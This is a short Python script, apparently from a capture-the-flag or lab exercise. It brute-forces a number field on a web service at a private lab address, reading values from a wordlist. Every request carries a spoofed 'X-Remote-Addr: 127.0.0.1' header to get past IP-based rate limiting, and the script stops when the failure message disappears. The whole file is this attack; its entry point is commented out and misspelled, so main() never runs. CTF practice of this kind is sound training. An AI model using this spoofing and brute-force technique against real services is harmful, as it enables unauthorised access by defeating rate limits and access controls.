import requests
import sys
import re


url =   "http://10.10.211.169:8085/"  
expression = "Oh no! How unlucky. Spin the wheel and try again"

def brute(number):
	data = {'number':number}
	r = requests.post(url,data=data , headers = {"X-Remote-Addr": "127.0.0.1"})
	if expression not in r.content :
		print (" Correct number Found: "      ,  number)
		sys.exit()
	else:
		print (" try number : "  ,number)



def main():
	words = [w.strip() for w in open("wordlist"   , "rb").readlines()] #parse wordlist
	for payload in words:
		brute(payload)

#yif __name__ == '__main__':
